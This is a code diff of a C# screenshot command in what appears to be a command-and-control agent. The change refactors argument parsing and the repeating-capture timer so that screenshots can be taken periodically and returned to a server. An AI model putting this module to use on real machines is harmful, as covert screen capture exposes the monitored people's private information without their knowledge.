@@ -4,6 +4,8 @@ using System.IO.Compression;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using screenshot;
+using System.Text.Json;
 
 
 //Nuget - System.drawing.common 
@@ -22,47 +24,30 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            int intervalInSeconds = 0; // Default interval should be 0 to just take one
+            ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
 
-            if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
+            if (args.interval <= 0)
             {
-                // Check if the interval is specified and non-negative
-                if (intervalInSeconds < 0)
-                {
-                    messageManager.Write("Invalid interval value. It must be a non-negative integer.", job.task.id, true, "error");
-                    return;
-                }
-
-                if (intervalInSeconds == 0)
-                {
-                    // If interval is 0, take just one screenshot immediately
-                    CaptureAndSendScreenshot(args, job.task.id);
-                    return;
-                }
-
-                // Initialize the timer to capture screenshots at the specified interval
-                screenshotTimer = new System.Timers.Timer(intervalInSeconds * 1000); // Convert seconds to milliseconds
-                screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(args, job.task.id);
+                await CaptureAndSendScreenshot(job.task.id);
+            }
+            else
+            {
+                screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
+                screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(job.task.id);
 
                 // Set AutoReset to false for a one-time execution if the interval is greater than 0
-                screenshotTimer.AutoReset = intervalInSeconds > 0;
+                screenshotTimer.AutoReset = args.interval > 0;
                 screenshotTimer.Enabled = true;
                 await messageManager.AddResponse(new ResponseResult
                 {
                     completed = true,
-                    user_output = $"Capturing screenshots every {intervalInSeconds} seconds.",
+                    user_output = $"Capturing screenshots every {args.interval} seconds.",
                     task_id = job.task.id,
                 });
             }
-            else
-            {
-                // If interval is not specified, take just one screenshot immediately
-                await CaptureAndSendScreenshot(args, job.task.id);
-            }
         }
 
-        private async Task CaptureAndSendScreenshot(Dictionary<string, string> args, string task_id)
+        private async Task CaptureAndSendScreenshot(string task_id)
         {
             try
             {
@@ -120,7 +105,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
+                await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
             }
         }
     }
